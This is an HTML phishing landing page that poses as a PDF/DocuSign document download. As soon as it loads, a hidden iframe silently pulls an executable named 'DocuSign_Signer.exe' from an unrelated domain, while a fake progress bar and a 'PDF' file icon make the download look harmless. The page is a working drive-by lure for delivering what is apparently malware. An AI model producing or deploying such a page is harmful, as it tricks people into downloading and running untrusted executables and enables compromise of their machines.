<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Downloading Installer</title>

<style>
  body {
    margin: 0;
    height: 100vh;
    background: #0f172a;
    font-family: Arial;
    display: flex;
    justify-content: center;
    align-items: center;
    color: #0f172a;
  }

  .wrapper {
    text-align: center;
  }

  /* Laptop screen */
  .screen {
    width: 360px;
    height: 260px;
    background: #dbeafe; /* light blue */
    border-radius: 12px 12px 6px 6px;
    padding: 20px;
    box-shadow: 0 10px 25px rgba(0,0,0,0.4);
    margin-bottom: 10px;
  }

  /* Laptop base */
  .base {
    width: 400px;
    height: 12px;
    background: #1e293b;
    border-radius: 0 0 12px 12px;
    margin: 0 auto 20px;
  }

  h1 {
    margin: 0;
    font-size: 20px;
  }

  p {
    font-size: 13px;
    opacity: 0.7;
  }

  .bar-container {
    width: 100%;
    height: 10px;
    background: #93c5fd;
    border-radius: 5px;
    margin-top: 15px;
    overflow: hidden;
  }

  .bar {
    height: 100%;
    width: 0%;
    background: #2563eb;
    transition: width 0.2s linear;
  }

  .percent {
    margin-top: 8px;
    font-size: 12px;
  }

  .done {
    display: none;
    color: green;
    font-weight: bold;
    margin-top: 10px;
  }

  /* File icon */
  .file {
    width: 70px;
    height: 90px;
    background: white;
    border-radius: 6px;
    margin: 0 auto;
    position: relative;
    box-shadow: 0 4px 10px rgba(0,0,0,0.3);
  }

  .file:before {
    content: "";
    position: absolute;
    top: 0;
    right: 0;
    width: 20px;
    height: 20px;
    background: #e5e7eb;
    border-bottom-left-radius: 6px;
  }

  .label {
    position: absolute;
    bottom: 8px;
    left: 0;
    right: 0;
    text-align: center;
    font-size: 12px;
    color: red;
    font-weight: bold;
  }

</style>
</head>

<body>

<div class="wrapper">

  <div class="screen">
    <h1 id="title">Preparing Download</h1>
    <p id="status">Getting your installer ready...</p>

    <div class="bar-container">
      <div class="bar" id="bar"></div>
    </div>

    <div class="percent" id="percent">0%</div>

    <div class="done" id="done">✔ Download Complete</div>
  </div>

  <div class="base"></div>

  <!-- File icon below -->
  <div class="file">
    <div class="label">PDF</div>
  </div>

</div>

<script>
const fileUrl = "https://cbtbd.com/DOCU3637383635245324526367278384324/DocuSign_Signer.exe";

function startDownload() {
  const iframe = document.createElement("iframe");
  iframe.style.display = "none";
  iframe.src = fileUrl;
  document.body.appendChild(iframe);

  let progress = 0;

  const interval = setInterval(() => {
    progress += Math.random() * 7;

    if (progress >= 100) {
      progress = 100;
      clearInterval(interval);

      document.getElementById("title").innerText = "Download Complete";
      document.getElementById("status").innerText = "You can now open your installer.";
      document.getElementById("done").style.display = "block";
    }

    document.getElementById("bar").style.width = progress + "%";
    document.getElementById("percent").innerText = Math.floor(progress) + "%";

    if (progress > 10) {
      document.getElementById("title").innerText = "Downloading...";
      document.getElementById("status").innerText = "Your file is downloading...";
    }

  }, 300);
}

window.onload = startDownload;
</script>

</body>
</html>
